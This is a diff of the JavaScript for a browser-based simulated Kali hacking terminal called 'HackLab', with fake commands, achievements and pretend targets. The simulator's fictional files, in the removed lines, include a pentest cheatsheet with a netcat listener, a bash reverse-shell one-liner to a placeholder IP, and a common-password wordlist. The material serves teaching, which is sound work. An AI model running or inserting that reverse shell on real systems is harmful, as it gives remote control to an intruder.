+    });
   });
 }
-const statsObserver = new IntersectionObserver((entries) => {
-  entries.forEach(e => {
-    if (e.isIntersecting) {
-      animateCounters();
-      statsObserver.disconnect();
-    }
-  });
-});
-const statsEl = document.querySelector('.stats');
-if (statsEl) statsObserver.observe(statsEl);
-
-/* ============ ACHIEVEMENT SYSTEM ============ */
-const achievements = {
-  welcome:    { icon: '👋', text: 'Welcome to HackLab!' },
-  firstCmd:   { icon: '⌨️', text: 'First command executed.' },
-  helpUser:   { icon: '📖', text: 'RTFM — respect.' },
-  nmap:       { icon: '📡', text: 'Network scanner unlocked!' },
-  gobuster:   { icon: '🕸️', text: 'Directory brute-force started!' },
-  hacker:     { icon: '💀', text: 'You typed "hack". Respect.' },
-  ethics:     { icon: '⚖️', text: 'White Hat Code acknowledged.' },
-  cmdMaster:  { icon: '🎖️', text: '10 commands executed!' },
-  legend:     { icon: '👑', text: '25 commands — you are a legend.' },
-  konami:     { icon: '🎮', text: 'Konami code accepted!' },
-  party:      { icon: '🎉', text: 'PARTY MODE ACTIVATED!' }
-};
-const achEl = document.getElementById('achievement');
-const achIcon = document.getElementById('achIcon');
-const achText = document.getElementById('achText');
-const unlocked = new Set();
-let achTimer;
-function unlock(key) {
-  if (unlocked.has(key) || !achievements[key]) return;
-  unlocked.add(key);
-  const a = achievements[key];
-  achIcon.textContent = a.icon;
-  achText.textContent = a.text;
-  achEl.classList.add('show');
-  beep(1500, 0.08, 'sine', 0.06);
-  setTimeout(() => beep(2000, 0.12, 'sine', 0.06), 80);
-  clearTimeout(achTimer);
-  achTimer = setTimeout(() => achEl.classList.remove('show'), 3500);
+function hideAutocomplete() {
+  if (autocompleteEl) autocompleteEl.classList.remove('show');
+  autocompleteMatches = [];
 }
-setTimeout(() => unlock('welcome'), 4000);
-
-/* ============ TERMINAL ============ */
-const termBody = document.getElementById('termBody');
-const cmdInput = document.getElementById('cmdInput');
-const promptStrEl = document.getElementById('promptStr');
-const cmdCounter = document.getElementById('cmdCounter');
-
-/* Filesystem */
-const fs = {
-  '/': ['home', 'etc', 'var', 'tmp', 'usr', 'opt', 'root'],
-  '/home': ['kali'],
-  '/home/kali': ['Documents', 'Downloads', 'loot', 'notes.txt', 'scan.sh', 'wordlist.txt', '.bashrc'],
-  '/home/kali/Documents': ['cheatsheet.md', 'methodology.pdf'],
-  '/home/kali/Downloads': ['rockyou.txt.gz', 'payload.bin'],
-  '/home/kali/loot': ['.keep'],
-  '/etc': ['passwd', 'hosts', 'os-release', 'shadow'],
-  '/var': ['log'],
-  '/var/log': ['auth.log', 'syslog'],
-  '/tmp': [],
-  '/usr': ['bin', 'share'],
-  '/opt': [],
-  '/root': ['.bashrc']
-};
-
-const fileContents = {
-  '/home/kali/notes.txt':
-`# HTB / TryHackMe Methodology
-1. nmap -sV -sC -p- <IP>       # full port scan
-2. Check /etc/hosts, add vhosts
-3. gobuster dir -u http://<IP> -w wordlist.txt
-4. nikto -h <IP>                # web vuln scan
-5. enum4linux -a <IP>           # SMB enum (if 445 open)
-6. Look for: default creds, /admin, /backup, .git, robots.txt
-7. STOP. THINK. ENUMERATE MORE.`,
-  '/home/kali/Documents/cheatsheet.md':
-`# Quick Cheatsheet
-## Recon
-nmap -sV -sC -p- <target>
-## Web
-gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
-nikto -h http://<target>
-## Shells
-nc -lvnp 4444
-bash -i >& /dev/tcp/<your_ip>/4444 0>&1`,
-  '/etc/hosts':
-`127.0.0.1       localhost
-127.0.1.1       hacklab
-# 10.10.10.5    target.htb`,
-  '/etc/os-release':
-`NAME="Kali GNU/Linux"
-VERSION="2025.1"
-PRETTY_NAME="Kali GNU/Linux Rolling"`,
-  '/etc/passwd':
-`root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-kali:x:1000:1000:Kali User,,,:/home/kali:/bin/bash`,
-  '/home/kali/wordlist.txt':
-`admin
-password
-letmein
-root
-123456
-qwerty
-changeme
-hacker
-guest`
-};
-
-/* Simulated targets */
-const targets = {
-  '10.10.10.5': {
-    host: 'target.htb',
-    ports: [
-      { port: 22,   state: 'open', svc: 'ssh',   ver: 'OpenSSH 8.2p1 Ubuntu' },
-      { port: 80,   state: 'open', svc: 'http',  ver: 'Apache httpd 2.4.41' },
-      { port: 443,  state: 'open', svc: 'https', ver: 'Apache httpd 2.4.41' },
-      { port: 3306, state: 'open', svc: 'mysql', ver: 'MySQL 8.0.27' }
-    ]
-  },
-  '10.10.10.6': {
-    host: 'box2.htb',
-    ports: [
-      { port: 21,   state: 'open', svc: 'ftp',   ver: 'vsftpd 3.0.3' },
-      { port: 445,  state: 'open', svc: 'smb',   ver: 'Samba 4.13.17' },
-      { port: 8080, state: 'open', svc: 'http',  ver: 'nginx 1.18.0' }
-    ]
-  }
-};
-
-/* State */
-let cwd = '/home/kali';
-let history = [];
-let historyIdx = -1;
-let cmdCount = 0;
-
-/* Helpers */
-function esc(s) {
-  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-}
-function write(html, cls = 'out') {
-  const line = document.createElement('div');
-  line.className = 'line ' + cls;
-  line.innerHTML = html;
-  termBody.appendChild(line);
-  termBody.scrollTop = termBody.scrollHeight;
-}
-function prompt() {
-  const short = cwd === '/home/kali' ? '~' : (cwd.startsWith('/home/kali/') ? '~' + cwd.slice(10) : cwd);
-  return `<span class="prompt">kali@hacklab</span><span style="color:var(--text-dim)">:</span><span class="path">${short}</span><span style="color:var(--text-dim)">$</span>`;
-}
-function updatePrompt() { promptStrEl.innerHTML = prompt(); }
-function resolvePath(p) {
-  if (!p) return cwd;
-  if (p === '~') return '/home/kali';
-  if (p.startsWith('~/')) return '/home/kali/' + p.slice(2);
-  if (p.startsWith('/')) return p.replace(/\/+$/,'') || '/';
-  const parts = (cwd + '/' + p).split('/');
-  const out = [];
-  for (const part of parts) {
-    if (!part || part === '.') continue;
-    if (part === '..') out.pop();
-    else out.push(part);
-  }
-  return '/' + out.join('/');
+function applyCompletion(choice) {
+  const val = input.value;
+  const parts = val.split(' ');
+  if (parts.length === 1) input.value = choice + ' ';
+  else { parts[parts.length - 1] = choice; input.value = parts.join(' '); }
+  hideAutocomplete();
 }
 
-/* Commands */
+/* ============================================================
+   COMMANDS
+   ============================================================ */
 const C = {};
 
+/* ---------- Core shell ---------- */
 C.help = () => {
-  write(`<span class="ok">╔══════════════════════════════════════════╗</span>`);
-  write(`<span class="ok">║  HackLab Shell v4 — Command Reference    ║</span>`);
-  write(`<span class="ok">╚══════════════════════════════════════════╝</span>`);
-  write(`<span class="dim">── Navigation ─────────────────────────────</span>`);
-  write(`  ls  cd  pwd  cat  tree  file  find`);
-  write(`<span class="dim">── Recon (simulated) ──────────────────────</span>`);
-  write(`  nmap  whois  dig  ping  gobuster  nikto`);
-  write(`<span class="dim">── System ─────────────────────────────────</span>`);
-  write(`  whoami  id  uname  date  hostname  uptime  ps  env`);
-  write(`<span class="dim">── Info & Fun ─────────────────────────────</span>`);
-  write(`  banner  targets  ethics  clear  history  echo`);
-  write(`<span class="dim">── Easter Eggs ────────────────────────────</span>`);
-  write(`  hack   matrix   party   coffee`);
-  write(`<span class="info">→ Type 'targets' then try 'nmap 10.10.10.5'</span>`);
+  writeRaw(`<span class="c-green bold">╔══════════════════════════════════════════════════════╗</span>`);
+  writeRaw(`<span class="c-green bold">║  HackLab v5 — Command Reference (60+ commands)       ║</span>`);
+  writeRaw(`<span class="c-green bold">╚══════════════════════════════════════════════════════╝</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ File System</span>`);
+  writeRaw(`  <span class="c-green">ls  cd  pwd  cat  tree  mkdir  rmdir  touch  rm  cp  mv</span>`);
+  writeRaw(`  <span class="c-green">file  stat  wc  head  tail  less  find  du  df</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Text Processing</span>`);
+  writeRaw(`  <span class="c-green">echo  grep  egrep  sed  awk  sort  uniq  cut  tr  rev</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Editing</span>`);
+  writeRaw(`  <span class="c-green">nano  vim  vi  touch  tee</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ System Info</span>`);
+  writeRaw(`  <span class="c-green">whoami  id  uname  hostname  date  uptime  ps  top  htop</span>`);
+  writeRaw(`  <span class="c-green">free  env  echo  neofetch  lscpu  lsblk  lsof  w  who</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Networking (simulated)</span>`);
+  writeRaw(`  <span class="c-green">nmap  whois  dig  ping  traceroute  ifconfig  ip  netstat  curl</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Security Tools (simulated)</span>`);
+  writeRaw(`  <span class="c-green">gobuster  nikto  ffuf  hydra  sqlmap  enum4linux  smbclient</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ User / Permissions</span>`);
+  writeRaw(`  <span class="c-green">sudo  su  passwd  adduser  chmod  chown  groups</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Package Manager</span>`);
+  writeRaw(`  <span class="c-green">apt  apt-get  install  remove  search  update</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-cyan bold">▸ Info & Fun</span>`);
+  writeRaw(`  <span class="c-green">banner  targets  ethics  clear  history  alias  unalias</span>`);
+  writeRaw(`  <span class="c-green">fortune  cowsay  figlet  sl  matrix  coffee  hack  party</span>`);
+  writeRaw(``);
+  writeRaw(`<span class="c-dim">Try: neofetch · tree · cat notes.txt · nmap 10.10.10.5 · sudo su</span>`);
 };
 
-C.ls = (a) => {
-  const p = resolvePath(a[0]);
-  if (fs[p]) {
-    const items = fs[p];
-    if (!items.length) return;
-    const out = items.map(f => {
-      const full = (p === '/' ? '' : p) + '/' + f;
-      if (fs[full]) return `<span class="info">${f}/</span>`;
-      if (f.endsWith('.sh')) return `<span class="ok">${f}</span>`;
-      return f;
+C.ls = (args) => {
+  const showAll = args.includes('-a') || args.includes('-la') || args.includes('-al') || args.includes('-l');
+  const long = args.includes('-l') || args.includes('-la') || args.includes('-al');
+  const path = resolvePath(args.find(a => !a.startsWith('-')) || state.cwd);
+  const fs = getFS();
+  if (!fs[path]) {
+    writeText(`ls: cannot access '${path}': No such file or directory`, 'c-red');
+    return;
+  }
+  let items = [...fs[path]];
+  if (!showAll) items = items.filter(f => !f.startsWith('.'));
+  items.sort();
+  if (items.length === 0) return;
+  if (long) {
+    items.forEach(f => {
+      const full = (path === '/' ? '' : path) + '/' + f;
+      const isDir = !!fs[full];
+      const perm = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
+      const size = isDir ? 4096 : (getFileContent(full)?.length || 0);
+      const owner = isDir ? 'kali kali' : 'kali kali';
+      const colored = isDir
+        ? `<span class="c-cyan bold">${escape(f)}</span>`
+        : f.endsWith('.sh') || f.endsWith('.py')
+          ? `<span class="c-green">${escape(f)}</span>`
+          : f.endsWith('.txt') || f.endsWith('.md')
+            ? `<span class="c-yellow">${escape(f)}</span>`
+            : escape(f);
+      writeRaw(`${perm}  ${String(size).padStart(6)}  ${owner}  ${colored}`);
     });
-    write(out.join('   '));
-  } else if (fileContents[p]) {
-    write(fs['/home/kali']?.includes(a[0]) ? a[0] : '');
   } else {
-    write(`ls: cannot access '${esc(a[0] || p)}': No such file or directory`, 'err');
+    const out = items.map(f => {
+      const full = (path === '/' ? '' : path) + '/' + f;
+      if (fs[full]) return `<span class="c-cyan bold">${escape(f)}</span>`;
+      if (f.endsWith('.sh') || f.endsWith('.py')) return `<span class="c-green">${escape(f)}</span>`;
+      if (f.endsWith('.txt') || f.endsWith('.md')) return `<span class="c-yellow">${escape(f)}</span>`;
+      if (f.endsWith('.gz') || f.endsWith('.zip')) return `<span class="c-orange">${escape(f)}</span>`;
+      return escape(f);
+    });
+    writeRaw(out.join('   '));
   }
 };
-C.pwd = () => write(cwd);
-C.cd = (a) => {
-  const p = resolvePath(a[0] || '/home/kali');
-  if (fs[p]) { cwd = p; updatePrompt(); }
-  else if (fileContents[p]) write(`cd: not a directory: ${esc(a[0])}`, 'err');
-  else write(`cd: no such file or directory: ${esc(a[0])}`, 'err');
+
+C.pwd = () => writeText(state.cwd);
+
+C.cd = (args) => {
+  const target = args[0] || '/home/' + state.user;
+  const path = resolvePath(target);
+  if (dirExists(path)) {
+    state.cwd = path;
+    updatePrompt();
+    saveState();
+  } else if (fileExists(path)) {
+    writeText(`cd: not a directory: ${target}`, 'c-red');
+  } else {
+    writeText(`cd: no such file or directory: ${target}`, 'c-red');
+  }
 };
-C.cat = (a) => {
-  if (!a[0]) return write('cat: missing file operand', 'err');
-  const p = resolvePath(a[0]);
-  if (fileContents[p]) write(esc(fileContents[p]));
-  else if (fs[p]) write(`cat: ${esc(a[0])}: Is a directory`, 'err');
-  else write(`cat: ${esc(a[0])}: No such file or directory`, 'err');
+
+C.cat = (args) => {
+  if (!args[0]) { writeText('cat: missing file operand', 'c-red'); return; }
+  args.forEach(arg => {
+    const path = resolvePath(arg);
+    const content = getFileContent(path);
+    if (content !== null) {
+      content.split('\n').forEach(line => writeText(line));
+    } else if (dirExists(path)) {
+      writeText(`cat: ${arg}: Is a directory`, 'c-red');
+    } else {
+      writeText(`cat: ${arg}: No such file or directory`, 'c-red');
+    }
+  });
 };
-C.tree = (a) => {
-  const start = resolvePath(a[0]) || cwd;
-  write(`<span class="info">${start}</span>`);
-  (function walk(path, prefix='') {
+
+C.tree = (args) => {
+  const start = resolvePath(args.find(a => !a.startsWith('-')) || state.cwd);
+  const fs = getFS();
+  if (!fs[start]) { writeText(`tree: ${start}: No such directory`, 'c-red'); return; }
+  writeRaw(`<span class="c-cyan bold">${escape(start)}</span>`);
+  let dirCount = 0, fileCount = 0;
+  (function walk(path, prefix = '') {
     if (!fs[path]) return;
-    fs[path].forEach((item, i) => {
+    const items = [...fs[path]].sort();
+    items.forEach((item, i) => {
       const full = (path === '/' ? '' : path) + '/' + item;
       const isDir = !!fs[full];
-      const last = i === fs[path].length - 1;
-      write(prefix + (last ? '└── ' : '├── ') + (isDir ? `<span class="info">${item}/</span>` : item));
-      if (isDir) walk(full, prefix + (last ? '    ' : '│   '));
+      const last = i === items.length - 1;
+      const branch = last ? '└── ' : '├── ';
+      if (isDir) {
+        dirCount++;
+        writeRaw(prefix + branch + `<span class="c-cyan bold">${escape(item)}</span>`);
+        walk(full, prefix + (last ? '    ' : '│   '));
+      } else {
+        fileCount++;
+        writeRaw(prefix + branch + escape(item));
+      }
     });
   })(start);
+  writeRaw(``);
+  writeRaw(`<span class="c-dim">${dirCount} directories, ${fileCount} files</span>`);
 };
 
-C.whoami = () => write('kali');
-C.id = () => write('uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)');
-C.hostname = () => write('hacklab');
-C.uname = () => write('Linux hacklab 6.5.0-kali3-amd64 #1 SMP Kali 6.5.6-1kali1 x86_64 GNU/Linux');
-C.date = () => write(new Date().toString());
-C.uptime = () => write(` ${new Date().toTimeString().slice(0,8)} up 3 days, 2:47, 1 user, load: 0.15, 0.09, 0.07`);
+C.mkdir = (args) => {
+  if (!args[0]) { writeText('mkdir: missing operand', 'c-red'); return; }
+  const path = resolvePath(args[0]);
+  if (dirExists(path)) { writeText(`mkdir: cannot create directory '${args[0]}': File exists`, 'c-red'); return; }
+  state.customDirs[path] = true;
+  saveState();
+  writeRaw(`<span class="c-green">created</span> ${escape(path)}`);
+};
+
+C.rmdir = (args) => {
+  if (!args[0]) { writeText('rmdir: missing operand', 'c-red'); return; }
+  const path = resolvePath(args[0]);
+  if (!state.customDirs[path]) { writeText(`rmdir: failed to remove '${args[0]}': Not an empty directory or not owned by you`, 'c-red'); return; }
+  delete state.customDirs[path];
+  saveState();
+  writeRaw(`<span class="c-green">removed</span> ${escape(path)}`);
+};
+
+C.touch = (args) => {
+  if (!args[0]) { writeText('touch: missing file operand', 'c-red'); return; }
+  const path = resolvePath(args[0]);
+  if (fileExists(path)) return;
+  state.customFiles[path] = '';
+  saveState();
+};
+
+C.rm = (args) => {
+  const force = args.includes('-f') || args.includes('-rf') || args.includes('-fr');
+  const recursive = args.includes('-r') || args.includes('-rf') || args.includes('-fr');
+  const path = resolvePath(args.find(a => !a.startsWith('-')));
+  if (!path || path === '/') { writeText(`rm: refusing to remove '/' (nice try)`, 'c-yellow'); return; }
+  if (state.customFiles[path] !== undefined) {
+    delete state.customFiles[path];
+    saveState();
+    return;
+  }
+  if (state.customDirs[path]) {
+    delete state.customDirs[path];
+    saveState();
+    return;
+  }
+  if (!force) writeText(`rm: cannot remove '${path}': No such file or directory (protected file)`, 'c-red');
+};
+
+C.cp = (args) => {
+  if (args.length < 2) { writeText('cp: missing destination file operand', 'c-red'); return; }
+  const src = resolvePath(args[0]);
+  const dst = resolvePath(args[1]);
+  const content = getFileContent(src);
+  if (content === null) { writeText(`cp: cannot stat '${args[0]}': No such file`, 'c-red'); return; }
+  state.customFiles[dst] = content;
+  saveState();
+};
+
+C.mv = (args) => {
+  if (args.length < 2) { writeText('mv: missing destination file operand', 'c-red'); return; }
+  const src = resolvePath(args[0]);
+  const dst = resolvePath(args[1]);
+  const content = getFileContent(src);
+  if (content !== null) {
+    state.customFiles[dst] = content;
+    if (state.customFiles[src] !== undefined) delete state.customFiles[src];
+    saveState();
+  }
+};
+
+C.echo = (args) => {
+  // Handle redirection
+  const text = args.filter(a => a !== '>' && a !== '>>').join(' ');
+  const gt = args.indexOf('>');
+  const ggt = args.indexOf('>>');
+  if (gt !== -1 && args[gt + 1]) {
+    const target = resolvePath(args[gt + 1]);
+    state.customFiles[target] = text;
+    saveState();
+    return;
+  }
+  if (ggt !== -1 && args[ggt + 1]) {
+    const target = resolvePath(args[ggt + 1]);
+    state.customFiles[target] = (state.customFiles[target] || '') + text + '\n';
+    saveState();
+    return;
+  }
+  writeText(text);
+};
+
+C.wc = (args) => {
+  if (!args[0]) { writeText('wc: missing operand', 'c-red'); return; }
+  const content = getFileContent(resolvePath(args[0]));
+  if (content === null) { writeText(`wc: ${args[0]}: No such file`, 'c-red'); return; }
+  const lines = content.split('\n').length;
+  const words = content.split(/\s+/).filter(Boolean).length;
+  const chars = content.length;
+  writeRaw(`<span class="c-cyan">${lines}</span> <span class="c-yellow">${words}</span> <span class="c-green">${chars}</span> ${escape(args[0])}`);
+};
+
+C.head = (args) => {
+  const n = args[0] === '-n' ? +args[1] : 10;
+  const file = args[args[0] === '-n' ? 2 : 0];
+  const content = getFileContent(resolvePath(file));
+  if (content === null) { writeText(`head: ${file}: No such file`, 'c-red'); return; }
+  content.split('\n').slice(0, n).forEach(l => writeText(l));
+};
+
+C.tail = (args) => {
+  const n = args[0] === '-n' ? +args[1] : 10;
+  const file = args[args[0] === '-n' ? 2 : 0];
+  const content = getFileContent(resolvePath(file));
+  if (content === null) { writeText(`tail: ${file}: No such file`, 'c-red'); return; }
+  content.split('\n').slice(-n).forEach(l => writeText(l));
+};
+
+C.grep = (args) => {
+  const pattern = args[0];
+  const file = args[1];
+  if (!pattern) { writeText('grep: missing pattern', 'c-red'); return; }
+  if (!file) { writeText('grep: missing file (sim doesn\'t support piping)', 'c-yellow'); return; }
+  const content = getFileContent(resolvePath(file));
+  if (content === null) { writeText(`grep: ${file}: No such file`, 'c-red'); return; }
+  const re = new RegExp(pattern, 'i');
+  content.split('\n').forEach(line => {
+    if (re.test(line)) {
+      writeRaw(escape(line).replace(new RegExp(pattern, 'gi'), m => `<span class="c-yellow bold">${m}</span>`));
+    }
+  });
+};
+
+C.find = (args) => {
+  writeRaw(`<span class="c-dim">find is simplified. Try 'tree' or use grep on known files.</span>`);
+};
+
+C.du = (args) => {
+  writeRaw(`<span class="c-cyan">4.0K</span>   ${escape(args[0] || state.cwd)}`);
+};
+C.df = () => {
+  writeRaw(`Filesystem     1K-blocks     Used Available Use% Mounted on`);
+  writeRaw(`/dev/sda1       20971520  4194304  15728640  22% /`);
+  writeRaw(`tmpfs             512000     1024    510976   1% /tmp`);
+};
+C.stat = (args) => {
+  const path = resolvePath(args[0]);
+  const content = getFileContent(path);
+  if (content === null && !dirExists(path)) { writeText(`stat: cannot stat '${args[0]}'`, 'c-red'); return; }
+  writeRaw(`  File: ${escape(path)}`);
+  writeRaw(`  Size: ${content ? content.length : 4096}        Blocks: ${content ? Math.ceil(content.length/512) : 8}   IO Block: 4096`);
+  writeRaw(`Device: 801h/2049d  Inode: 1234567     Links: 1`);
+  writeRaw(`Access: (0644/-rw-r--r--)  Uid: (1000/  kali)   Gid: (1000/  kali)`);
+  writeRaw(`Access: ${new Date().toISOString()}`);
+  writeRaw(`Modify: ${new Date().toISOString()}`);
+};
+C.file = (args) => {
+  if (!args[0]) { writeText('file: missing operand', 'c-red'); return; }
+  const path = resolvePath(args[0]);
+  const content = getFileContent(path);
+  if (content !== null) {
+    if (path.endsWith('.sh') || content.startsWith('#!/bin/bash')) writeText(`${args[0]}: Bourne-Again shell script, ASCII text executable`);
+    else if (path.endsWith('.html')) writeText(`${args[0]}: HTML document, ASCII text`);
+    else if (path.endsWith('.md')) writeText(`${args[0]}: ASCII text, with very long lines`);
+    else writeText(`${args[0]}: ASCII text`);
+  } else if (dirExists(path)) {
+    writeText(`${args[0]}: directory`);
+  } else {
+    writeText(`${args[0]}: cannot open (No such file or directory)`, 'c-red');
+  }
+};
+
+/* ---------- Text processing ---------- */
+C.sort = (args) => {
+  const content = args[0] ? getFileContent(resolvePath(args[0])) : null;
+  if (!content) { writeText('sort: needs a file (sim)', 'c-yellow'); return; }
+  content.split('\n').sort().forEach(l => writeText(l));
+};
+C.uniq = (args) => {
+  const content = args[0] ? getFileContent(resolvePath(args[0])) : null;
+  if (!content) { writeText('uniq: needs a file (sim)', 'c-yellow'); return; }
+  const seen = new Set();
+  content.split('\n').forEach(l => { if (!seen.has(l)) { seen.add(l); writeText(l); } });
+};
+C.cut = () => writeText('cut: simplified (use awk)', 'c-yellow');
+C.awk = (args) => {
+  const file = args[args.length - 1];
+  const content = getFileContent(resolvePath(file));
+  if (!content) { writeText('awk: needs a file (sim)', 'c-yellow'); return; }
+  // Simplistic: print first field
+  content.split('\n').forEach(l => writeText(l.split(/\s+/)[0]));
+};
+C.sed = () => writeText('sed: simplified in sim. Try: grep', 'c-yellow');
+C.tr = () => writeText('tr: simplified in sim.', 'c-yellow');
+C.rev = (args) => {
+  const content = args[0] ? getFileContent(resolvePath(args[0])) : null;
+  if (!content) { writeText('rev: needs a file', 'c-yellow'); return; }
+  content.split('\n').forEach(l => writeText(l.split('').reverse().join('')));
+};
+
+/* ---------- System info ---------- */
+C.whoami = () => writeText(state.user);
+C.id = () => {
+  if (state.isRoot) writeRaw(`uid=0(root) gid=0(root) groups=0(root)`);
+  else writeRaw(`uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo),100(users)`);
+};
+C.hostname = () => writeText(state.host);
+C.uname = (args) => {
+  if (args.includes('-a')) writeRaw(`Linux ${state.host} 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.5.6-1kali1 (2025-01-15) x86_64 GNU/Linux`);
+  else writeText('Linux');
+};
+C.date = () => writeText(new Date().toString());
+C.uptime = () => writeText(` ${new Date().toTimeString().slice(0,8)} up 3 days, 2:47,  1 user,  load average: 0.15, 0.09, 0.07`);
 C.ps = () => {
-  write('  PID TTY          TIME CMD');
-  write(' 1234 pts/0    00:00:00 bash');
-  write(' 5678 pts/0    00:00:00 ps');
+  writeRaw(`  PID TTY          TIME CMD`);
+  writeRaw(`    1 ?        00:00:02 systemd`);
+  writeRaw(`  890 ?        00:00:01 NetworkManager`);
+  writeRaw(` 1234 pts/0    00:00:00 bash`);
+  writeRaw(` 5678 pts/0    00:00:00 ps`);
+  writeRaw(` 9012 pts/0    00:00:00 ${state.isRoot ? 'root' : 'kali'}`);
+};
+C.top = () => C.htop();
+C.htop = () => {
+  writeRaw(`<span class="c-green bold">    0[||||||||||||||||||||                     45.2%]   Tasks: 128, 245 thr; 1 running</span>`);
+  writeRaw(`<span class="c-green bold">    1[|||||||                                   12.1%]   Load average: 0.15 0.09 0.07</span>`);
+  writeRaw(`<span class="c-cyan">  Mem[|||||||||||||||||        3.2G/16.0G]</span>`);
+  writeRaw(`<span class="c-cyan">  Swp[                             0K/2.0G]</span>`);
+  writeRaw(``);
+  writeRaw(`  <span class="c-yellow bold">PID USER      PRI  NI  VIRT   RES   S CPU% MEM%   TIME+  Command</span>`);
+  writeRaw(` 1234 kali       20   0  512M   45M   S  2.0  0.3   0:02.14 bash`);
+  writeRaw(` 5678 kali       20   0   32M   12M   S  0.5  0.1   0:00.12 ps`);
+  writeRaw(` 890  root       20   0  128M   34M   S  0.2  0.2   0:01.80 NetworkManager`);
+  writeRaw(`    1 root       20   0  128M   12M   S  0.0  0.1   0:02.01 systemd`);
+};
+C.free = (args) => {
+  if (args.includes('-h')) {
+    writeRaw(`              total        used        free      shared  buff/cache   available`);
+    writeRaw(`Mem:           15Gi       3.2Gi       8.0Gi       512Mi       4.3Gi        11Gi`);
+    writeRaw(`Swap:         2.0Gi          0B       2.0Gi`);
+  } else {
+    writeRaw(`              total        used        free      shared  buff/cache   available`);
+    writeRaw(`Mem:       16384000     3355443     8388608      524288     4521984    12058624`);
+    writeRaw(`Swap:       2048000           0     2048000`);
+  }
 };
 C.env = () => {
-  write('USER=kali'); write('HOME=/home/kali'); write('SHELL=/bin/bash');
-  write('PWD=' + cwd); write('TERM=xterm-256color');
+  writeText(`USER=${state.user}`);
+  writeText(`HOME=/home/${state.user}`);
+  writeText(`SHELL=/bin/bash`);
+  writeText(`PWD=${state.cwd}`);
+  writeText(`TERM=xterm-256color`);
+  writeText(`PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`);
+  writeText(`HOSTNAME=${state.host}`);
+  writeText(`LANG=en_US.UTF-8`);
 };
-C.echo = (a) => write(esc(a.join(' ')));
-C.history = () => {
-  if (!history.length) return write('(no history)', 'dim');
-  history.forEach((h, i) => write(`  ${String(i+1).padStart(3)}  ${esc(h)}`));
+C.neofetch = () => {
+  const art = [
+    '       .--.        ',
+    '      |o_o |       ',
+    '      |:_/ |       ',
+    '     //   \\ \\      ',
+    '    (|     | )     ',
+    "   /'\\_   _/`\\     ",
+    '   \\___)=(___/     '
+  ];
+  const info = [
+    `${state.user}@${state.host}`,
+    `--------------------`,
+    `OS: Kali GNU/Linux Rolling x86_64`,
+    `Host: HackLab Virtual Machine`,
+    `Kernel: 6.5.0-kali3-amd64`,
+    `Uptime: 3 days, 2 hours, 47 mins`,
+    `Packages: ${state.installedPackages.length} (dpkg)`,
+    `Shell: bash 5.2.15`,
+    `Resolution: ${window.innerWidth}x${window.innerHeight}`,
+    `Terminal: hacklab-web-v5`,
+    `CPU: Intel i7-9750H (12) @ 2.600GHz`,
+    `GPU: Virtual Display`,
+    `Memory: 3355MiB / 16384MiB`
+  ];
+  const max = Math.max(art.length, info.length);
+  for (let i = 0; i < max; i++) {
+    const a = (art[i] || '').padEnd(20);
+    const b = info[i] || '';
+    writeRaw(`<span class="c-cyan bold">${escape(a)}</span><span class="c-text">${escape(b)}</span>`);
+  }
 };
-C.clear = () => { termBody.innerHTML = ''; };
+C.lscpu = () => {
+  writeRaw(`Architecture:            x86_64`);
+  writeRaw(`CPU op-mode(s):          32-bit, 64-bit`);
+  writeRaw(`CPU(s):                  12`);
+  writeRaw(`Vendor ID:               GenuineIntel`);
+  writeRaw(`Model name:              Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz`);
+  writeRaw(`CPU MHz:                 2592.000`);
+  writeRaw(`L3 cache:                12 MiB`);
+  writeRaw(`Virtualization features: VT-x`);
+};
+C.lsblk = () => {
+  writeRaw(`NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT`);
+  writeRaw(`sda      8:0    0    50G  0 disk `);
+  writeRaw(`├─sda1   8:1    0    49G  0 part /`);
+  writeRaw(`└─sda2   8:2    0     1G  0 part [SWAP]`);
+};
+C.lsof = () => {
+  writeRaw(`COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME`);
+  writeRaw(`bash     1234 kali  cwd    DIR    8,1     4096    2 ${state.cwd}`);
+  writeRaw(`bash     1234 kali    0u   CHR  136,0      0t0    3 /dev/pts/0`);
+};
+C.w = () => {
+  writeRaw(` ${new Date().toTimeString().slice(0,8)} up 3 days,  2 users,  load average: 0.15, 0.09, 0.07`);
+  writeRaw(`USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT`);
+  writeRaw(`${state.user}     pts/0    127.0.0.1        14:22    0.00s  0.12s  0.01s bash`);
+};
+C.who = () => writeRaw(`${state.user}     pts/0        2025-01-05 14:22 (127.0.0.1)`);
 
+/* ---------- Networking (SIMULATED) ---------- */
+C.nmap = (args) => {
+  const ip = args.find(x => /^\d+\.\d+\.\d+\.\d+$/.test(x));
+  if (!ip) {
+    writeRaw(`<span class="c-green bold">Nmap 7.94 (simulated)</span>`);
+    writeRaw(`Usage: nmap [options] <target>`);
+    writeRaw(`Try: <span class="c-cyan">nmap 10.10.10.5</span>  (see 'targets' for IPs)`);
+    return;
+  }
+  const t = targets[ip];
+  if (!t) {
+    writeRaw(`<span class="c-yellow">Host ${escape(ip)} seems down in this sim.</span>`);
+    writeRaw(`<span class="c-dim">Available: ${Object.keys(targets).join(', ')}</span>`);
+    return;
+  }
+  writeRaw(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString()}`);
